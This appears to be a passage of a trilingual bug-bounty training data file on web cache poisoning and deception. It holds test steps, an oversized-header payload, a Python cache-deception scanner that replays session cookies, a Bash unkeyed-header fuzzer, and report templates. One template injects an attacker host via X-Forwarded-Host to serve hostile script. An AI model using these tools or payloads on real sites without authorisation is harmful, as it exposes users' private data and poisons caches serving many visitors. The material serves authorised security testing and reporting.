      hi: "GET रिक्वेस्ट की बॉडी में पेलोड भेजकर देखें कि क्या बैकएंड उसे प्रोसेस कर रहा है।",
    },
    steps: [
      {
        en: "Find search, filter, or catalog endpoints taking query parameters (`/search?q=test`).",
        simple: "Find search pages on the website.",
        hi: "सर्च और फिल्टर वाले पेजों की पहचान करें।",
      },
      {
        en: "Send a GET request with an HTTP body and `Content-Type: application/x-www-form-urlencoded` in Burp Repeater.",
        simple: "Add a body to your GET request in Burp Repeater.",
        hi: "Burp Repeater में GET रिक्वेस्ट में बॉडी जोड़ें।",
      },
      {
        en: "Check if the parameter inside the body overrides the URL query parameter in the rendered HTML.",
        simple: "See if the body parameter shows up on the screen.",
        hi: "देखें कि क्या बॉडी वाला पैरामीटर स्क्रीन पर दिख रहा है।",
      },
    ],
    commandsOrPayloads: [
      `GET /search?q=apple HTTP/1.1\\nContent-Type: application/x-www-form-urlencoded\\n\\nq=banana`,
    ],
    keyTargets: [
      "Search and autocomplete inputs",
      "Filter and sorting parameters",
      "Ruby on Rails & Express.js backends",
    ],
  },
  {
    phase: 5,
    title: {
      en: "Phase 5: Denial of Service (DoS) & Header Overflow Poisoning",
      simple: "Phase 5: Checking if Sending Huge Headers Freezes the Page in Cache",
      hi: "चरण 5: हेडर ओवरफ्लो और 400 एरर कैश पॉइज़निंग की जांच",
    },
    objective: {
      en: "Safely verify whether oversized headers or illegal characters generate cached 400/431 error responses without impacting live users.",
      simple: "Send a long 8KB header with a safe test parameter to see if the 400 error gets saved in cache.",
      hi: "एक सुरक्षित टेस्ट पैरामीटर पर 8KB लंबा हेडर भेजकर देखें कि क्या 400 एरर कैश हो जाता है।",
    },
    steps: [
      {
        en: "Always use a unique cache-buster: `https://target.com/?dos_audit=random_guid`.",
        simple: "Always use a unique test parameter like ?dos_audit=test12345.",
        hi: "हमेशा `?dos_audit=123` जैसा रैंडम पैरामीटर लगाकर ही टेस्ट करें।",
      },
      {
        en: "Send a header with 8,500 bytes of padding to trigger Apache / Nginx header size limits.",
        simple: "Send an 8,500 character header to trigger a 400 Bad Request error.",
        hi: "8,500 अक्षरों का हेडर भेजकर 400 Bad Request एरर ट्रिगर करें।",
      },
      {
        en: "Send a subsequent clean request to the exact same URL: verify if the 400 error is served from cache (`HIT`).",
        simple: "Send a clean request without the header. If the error is still cached, report the vulnerability safely.",
        hi: "बिना हेडर के दोबारा खोलें। अगर अब भी 400 एरर और `HIT` दिखे, तो सुरक्षित PoC बनाकर रिपोर्ट करें।",
      },
    ],
    commandsOrPayloads: [
      `python3 -c 'print("A"*8500)'`,
      `curl -i -H "X-Oversized: [PADDING]" "https://target.com/?dos_audit=unique"`,
    ],
    keyTargets: [
      "Apache LimitRequestFieldSize (8KB limit)",
      "Node.js max-http-header-size",
      "CDN error caching page rules",
    ],
  },
];

// ─── 3. AUTOMATION SCRIPTS & TOOLS STASH ──────────────────────────────────────
export const CACHE_TOOLS_STASH: CacheToolSnippet[] = [
  {
    id: "cache-deception-scanner",
    title: {
      en: "Automated Web Cache Deception (WCD) Suffix & Delimiter Fuzzer",
      simple: "Python Script to Automatically Test 25+ Cache Deception Extensions",
      hi: "वेब कैश डिसेप्शन ऑटोमेटेड स्कैनर (25+ एक्सटेंशन और सिंबल्स)",
    },
    description: {
      en: "Tests authenticated profile endpoints with 25+ file extensions, semicolon matrix delimiters, and URL-encoded null bytes, automatically detecting whether edge CDNs return 'HIT' on private data.",
      simple: "A Python tool that tests your account page with all known cache tricks to see if your private data gets cached.",
      hi: "यह पायथन टूल आपके अकाउंट पेज पर 25 से ज्यादा एक्सटेंशन और सिंबल्स टेस्ट करके बताता है कि क्या डेटा CDN में सेव हो रहा है।",
    },
    category: "python_fuzzer",
    language: "python",
    code: `#!/usr/bin/env python3
"""
Web Cache Deception (WCD) Automation Scanner
Tests authenticated endpoints with static extensions and delimiters.
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

EXTENSIONS = [
    ".css", ".js", ".png", ".jpg", ".svg", ".ico", ".woff", ".woff2",
    "/test.css", "/test.js", "/style.css",
    ";.css", ";test.js", ";/test.css",
    "%23.css", "%23test.js",
    "%3f.css", "%00.css",
    "..%2fstatic%2fstyle.css"
]

def check_cache_headers(headers):
    for h in ["cf-cache-status", "x-cache", "x-cache-hits", "x-varnish", "age"]:
        if h in headers:
            return f"{h}: {headers[h]}"
    return None

def test_wcd(base_url, cookie_header):
    print(f"[*] Target Endpoint: {base_url}")
    print(f"[*] Testing {len(EXTENSIONS)} WCD permutations...\\n")

    headers = {
        "Cookie": cookie_header,
        "User-Agent": "Mozilla/5.0 (WCD-Security-Audit)"
    }

    # 1. Fetch baseline
    try:
        r_base = requests.get(base_url, headers=headers, verify=False, timeout=10)
        base_len = len(r_base.text)
        print(f"[+] Baseline authenticated response size: {base_len} bytes (Status: {r_base.status_code})\\n")
    except Exception as e:
        print(f"[!] Baseline request failed: {e}")
        return

    # 2. Test each extension
    for ext in EXTENSIONS:
        test_url = f"{base_url.rstrip('/')}{ext}"
        try:
            # First request to prime cache
            r1 = requests.get(test_url, headers=headers, verify=False, timeout=8)
            # Second request without cookies to test if cached publicly
            r2 = requests.get(test_url, verify=False, timeout=8)

            cache_indicator = check_cache_headers(r2.headers)
            diff = abs(len(r2.text) - base_len)

            if r2.status_code == 200 and diff < 150 and cache_indicator and "HIT" in cache_indicator.upper():
                print(f"\\033[1;32m[CRITICAL WCD DETECTED] {test_url}\\033[0m")
                print(f"    Cache Header: {cache_indicator}")
                print(f"    Unauthenticated Response Size: {len(r2.text)} bytes (Matches authenticated profile!)")
            elif r2.status_code == 200 and "HIT" in str(cache_indicator).upper():
                print(f"[?] Cached but different body ({len(r2.text)} bytes): {test_url} -> {cache_indicator}")
            else:
                sys.stdout.write(f"\\r[-] Probing {ext:<25} | Status: {r1.status_code}")
                sys.stdout.flush()

        except Exception as e:
            continue

    print("\\n\\n[*] WCD Audit complete.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <authenticated_profile_url> <cookie_string>")
        print(f"Example: {sys.argv[0]} https://target.com/api/me 'session=xyz; token=123'")
        sys.exit(1)

    test_wcd(sys.argv[1], sys.argv[2])`,
    howToUse: {
      en: "Run: `python3 wcd_scanner.py https://target.com/account/settings 'session=valid_token'`",
      simple: "Run the Python script with your account link and session cookie to test for leaks.",
      hi: "`python3 wcd_scanner.py <URL> <कुकी>` लिखकर चलाएं।",
    },
  },
  {
    id: "unkeyed-header-fuzzer",
    title: {
      en: "Bash Unkeyed Header Reflected Cache Poisoning Fuzzer",
      simple: "Bash Script to Fuzz 20+ Unkeyed Headers with Safe Cache-Busters",
      hi: "अनकीड हेडर रिफ्लेक्टेड कैश पॉइज़निंग फ़ज़र (Bash टूल)",
    },
    description: {
      en: "Fuzzes common unkeyed cache headers (`X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Scheme`) with unique cache busters to detect reflected host injections without touching production cache.",
      simple: "Tests 20+ secret headers with curl to see if any of them inject your test domain into the website.",
      hi: "यह बैश टूल 20+ हेडर्स को सुरक्षित तरीके से टेस्ट करता है ताकि पता चले कि क्या कोई हेडर XSS कोड इंजेक्ट कर सकता है।",
    },
    category: "bash_scanner",
    language: "bash",
    code: `#!/usr/bin/env bash
# Unkeyed Header Poisoning Fuzzer
TARGET="$1"

if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target.com>"
  exit 1
fi

CANARY="canary-poc-test-123.net"
HEADERS=(
  "X-Forwarded-Host: $CANARY"
  "X-Host: $CANARY"
  "X-Forwarded-Server: $CANARY"
  "X-Original-URL: /poison-test-$RANDOM"
  "X-Rewrite-URL: /poison-test-$RANDOM"
  "X-Forwarded-Scheme: nothttps"
  "X-Forwarded-Proto: http"
  "Base-Url: https://$CANARY"
  "Fastly-Client-IP: 127.0.0.1"
  "True-Client-IP: 127.0.0.1"
)

echo "[*] Auditing Unkeyed Headers on: $TARGET"

for HDR in "\${HEADERS[@]}"; do
  CB="cb_$RANDOM$RANDOM"
  TEST_URL="https://$TARGET/?$CB=1"

  echo -e "\\n[*] Testing: $HDR"
  # Prime request
  curl -sik -H "$HDR" "$TEST_URL" > /tmp/prime.txt
  
  # Check if canary reflected in body or headers
  REFLECTED=$(grep -i "$CANARY" /tmp/prime.txt || true)
  
  if [ -n "$REFLECTED" ]; then
    echo -e "    \\033[1;32m[+] POTENTIAL POISONING REFLECTION FOUND!\\033[0m"
    echo "        Header: $HDR"
    echo "        Reflection snippet: $(echo "$REFLECTED" | head -n 2)"
    
    # Check cache status on second clean request
    CACHE_STATUS=$(curl -sI "$TEST_URL" | grep -iE 'cache|age')
    echo "        Second Request Cache Headers:"
    echo "        $CACHE_STATUS"
  else
    echo "    [-] No reflection."
  fi
done

rm -f /tmp/prime.txt`,
    howToUse: {
      en: "Run: `./unkeyed_fuzzer.sh target.com` to test all standard unkeyed headers safely.",
      simple: "Run the script with the website name to scan for poisonable headers.",
      hi: "`./unkeyed_fuzzer.sh target.com` चलाकर अनकीड हेडर्स की जांच करें।",
    },
  },
];

// ─── 4. HIGH-YIELD BUG BOUNTY REPORT TEMPLATES ───────────────────────────────
export const CACHE_REPORT_TEMPLATES: CacheReportTemplate[] = [
  {
    id: "web-cache-deception-p1",
    title: {
      en: "P1 / Critical: Web Cache Deception on Authenticated User Profile Exposing PII & API Tokens",
      simple: "P1: Web Cache Deception Exposing Private User Data",
      hi: "P1 / क्रिटिकल: वेब कैश डिसेप्शन के ज़रिए यूज़र का निजी डेटा और API टोकन लीक",
    },
    vulnType: "Web Cache Deception / Sensitive Data Exposure",
    cvss: "8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)",
    severity: "critical",
    reportMarkdown: `## Summary
During the security assessment of **{TARGET_DOMAIN}**, a critical Web Cache Deception (WCD) vulnerability was identified on the user profile endpoint \`https://{TARGET_DOMAIN}/account/profile\`.

The edge caching proxy (Cloudflare / CloudFront) is configured to cache all requests ending with static extensions such as \`.css\` or \`.js\`. However, the backend application framework ignores trailing path segments and serves the authenticated user's private HTML profile when an arbitrary static extension is appended (e.g. \`/account/profile/styles.css\`).

An attacker can trick an authenticated victim into visiting this crafted URL. The CDN edge node caches the victim's private profile response, allowing the attacker to retrieve the victim's full name, email, phone number, and authentication tokens anonymously.

## Vulnerability Details
- **Vulnerable Endpoint:** \`https://{TARGET_DOMAIN}/account/profile\`
- **Exploitation Path:** \`https://{TARGET_DOMAIN}/account/profile/style.css\`
- **Caching Behavior:** CDN returns \`CF-Cache-Status: HIT\` / \`X-Cache: Hit from cloudfront\` with \`Cache-Control: public\`
- **Leaked Information:** Full Name, Email, Address, CSRF tokens, and internal account IDs.

## Proof of Concept (PoC)

### Step 1: Victim Visits Crafted Link (Authenticated)
While logged in as a legitimate user, navigate to:
\`\`\`http
GET /account/profile/theme.css HTTP/1.1
Host: {TARGET_DOMAIN}
Cookie: session_auth=victim_session_token_xyz
User-Agent: Mozilla/5.0
\`\`\`

**Server Response (Cached by Edge):**
\`\`\`http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
CF-Cache-Status: HIT
Cache-Control: public, max-age=14400

<html>
  <body>
    <h1>Account Profile</h1>
    <p>User: Jane Doe</p>
    <p>Email: jane.doe@victim.com</p>
    <input type="hidden" name="csrf_token" value="sec_tok_991823" />
  </body>
</html>
\`\`\`

### Step 2: Attacker Fetches Cached Response (Unauthenticated)
From a separate, completely unauthenticated incognito browser:
\`\`\`bash
curl -ik "https://{TARGET_DOMAIN}/account/profile/theme.css"
\`\`\`

**Response:**
\`\`\`http
HTTP/1.1 200 OK
CF-Cache-Status: HIT
Age: 25

<html><body><h1>Account Profile</h1><p>User: Jane Doe</p>...</body></html>
\`\`\`
The victim's private profile is returned with zero credentials supplied.

## Impact
This vulnerability allows mass exfiltration of sensitive Personally Identifiable Information (PII) and authentication tokens without requiring any technical exploit payload or XSS, resulting in high-impact account takeover and regulatory compliance violations (GDPR/CCPA).

## Remediation & Mitigation
1. **Explicit Cache-Control Directives:** Ensure all authenticated endpoints return explicit headers forbidding caching:
   \`\`\`http
   Cache-Control: no-store, no-cache, must-revalidate, private
   Pragma: no-cache
   \`\`\`
2. **Strict Route Matching:** Configure the origin web server to return \`HTTP 404 Not Found\` when unexpected subpaths or file extensions are appended to dynamic routes.
3. **Verify Content-Type Alignment:** Configure the CDN cache rules to verify that the returned \`Content-Type\` header matches the requested file extension before storing responses in edge memory.`,
  },
  {
    id: "web-cache-poisoning-xss-p1",
    title: {
      en: "P1 / Critical: Web Cache Poisoning via Unkeyed X-Forwarded-Host Leading to Global Stored XSS",
      simple: "P1: Web Cache Poisoning Leading to Mass XSS on All Visitors",
      hi: "P1 / क्रिटिकल: X-Forwarded-Host से वेब कैश पॉइज़निंग और ग्लोबल XSS",
    },
    vulnType: "Web Cache Poisoning / Persistent Cross-Site Scripting",
    cvss: "9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)",
    severity: "critical",
    reportMarkdown: `## Summary
A critical Web Cache Poisoning vulnerability was discovered on the primary landing page of **{TARGET_DOMAIN}**.

The web application reflects the value of the unkeyed HTTP header \`X-Forwarded-Host\` directly into a script inclusion tag on the homepage. Because the CDN edge cache does not include \`X-Forwarded-Host\` in its cache key calculation, an attacker can poison the cached homepage response globally, forcing all subsequent visitors to load and execute malicious JavaScript from an attacker-controlled server.

## Vulnerability Details
- **Target URL:** \`https://{TARGET_DOMAIN}/\`
- **Unkeyed Parameter:** \`X-Forwarded-Host\` HTTP header
- **Cache Key Components:** Scheme + Host + Path (\`https://{TARGET_DOMAIN}/\`)
- **Impact:** Zero-click Persistent Stored XSS affecting 100% of website visitors.

## Proof of Concept

### Step 1: Poisoning Request
*(Tested safely with an isolated cache-buster parameter during audit)*
\`\`\`http
GET /?cb={UNIQUE_POISON_ID} HTTP/1.1
Host: {TARGET_DOMAIN}
X-Forwarded-Host: evil-attacker-server.net
User-Agent: Mozilla/5.0
\`\`\`

**Server Response (Stored in Edge Cache):**
\`\`\`http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
CF-Cache-Status: HIT
Cache-Control: public, max-age=86400

<!DOCTYPE html>
<html>
<head>
  <script src="https://evil-attacker-server.net/static/analytics.js"></script>
</head>
<body>...</body>
</html>
\`\`\`

### Step 2: Verification of Poisoned Cache (Clean Request)
Requesting the URL normally from a different IP and browser without any custom headers:
\`\`\`bash
curl -ik "https://{TARGET_DOMAIN}/?cb={UNIQUE_POISON_ID}"
\`\`\`
**Response confirms the malicious script tag is served from edge cache (\`CF-Cache-Status: HIT\`).**

## Impact
An attacker can poison the primary homepage cache, allowing zero-click session hijacking, credential harvesting, malware delivery, and full website defacement for every visitor worldwide until the cache expires or is manually purged.

## Remediation
1. **Disable Unkeyed Header Reflection:** Do not construct dynamic resource URLs based on unvalidated client headers such as \`X-Forwarded-Host\` or \`X-Host\`. Hardcode the trusted production domain or use a strict allowlist.
2. **Include Headers in Cache Key:** If \`X-Forwarded-Host\` must be supported, configure the CDN to include it in the cache key.
3. **Deploy Content Security Policy (CSP):** Enforce a strict \`script-src\` directive preventing script loading from arbitrary external domains.`,
  },
];
